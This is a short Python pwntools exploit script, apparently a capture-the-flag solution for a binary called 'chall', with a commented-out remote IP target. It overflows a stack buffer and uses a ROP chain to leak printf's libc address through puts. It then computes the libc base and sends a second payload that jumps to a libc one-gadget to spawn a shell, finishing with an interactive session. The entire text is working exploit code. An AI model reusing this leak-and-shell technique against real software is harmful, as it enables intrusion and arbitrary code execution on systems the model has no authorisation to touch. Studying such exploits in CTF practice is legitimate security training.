from pwn import *
from pwn import p64
elf=ELF('./chall')
libc=elf.libc
p=elf.process()
# p=remote('65.21.255.31',13370)

p.sendline(b'0')
pop_rdi=p64(0x401433)
pop_rsi_r15=p64(0x401431)
str_adr=p64(0x40200B)
got_printf=p64(0x404028)
plt_puts=p64(elf.symbols['puts'])
plt_main=p64(elf.symbols['main'])

payload=b'\0'*(40+0x20)+pop_rdi+got_printf
payload+=plt_puts+plt_main
p.sendline(payload)

p.recvuntil(b'data: ')


hex_b=p.recv(6)
libc.address=int.from_bytes(hex_b,byteorder='little')-libc.symbols['printf']
print("Base address of Libc: ",hex(libc.address))
syscall=p64(libc.address+0xe3afe)
pop_r12_r15=p64(0x40142c)

p.sendline(b'0')
p.recvuntil(b'data: ')
payload=b'a'*(40+0x20)+pop_r12_r15+p64(0)*4+syscall

p.sendline(payload)
p.interactive()